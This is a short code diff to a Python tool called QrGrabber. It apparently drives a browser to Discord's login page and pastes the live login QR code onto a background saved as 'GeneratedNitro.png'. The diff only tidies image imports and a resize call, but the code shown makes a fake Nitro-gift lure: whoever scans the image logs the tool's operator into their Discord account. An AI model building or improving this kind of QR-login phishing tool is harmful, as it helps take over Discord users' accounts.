@@ -3,7 +3,8 @@ from selenium.webdriver.common.by import By
 import chromedriver_autoinstaller
 from time import sleep
 import urllib.request
-from PIL import Image, ImageDraw, ImageFilter
+from PIL import Image
+import  PIL
 import requests, random, string
 from pystyle import *
 import os
@@ -61,7 +62,7 @@ class QrGrabber:
         self.discord_login = self.driver.current_url
         background = Image.open('data/Background.png')
         qr = Image.open('data/qrcode.png')
-        qr = qr.resize((100,100), Image.LANCZOS)
+        qr = qr.resize((100,100))
         ReadyImg = background.copy()
         ReadyImg.paste(qr, (120, 60))
         ReadyImg.save('GeneratedNitro.png')
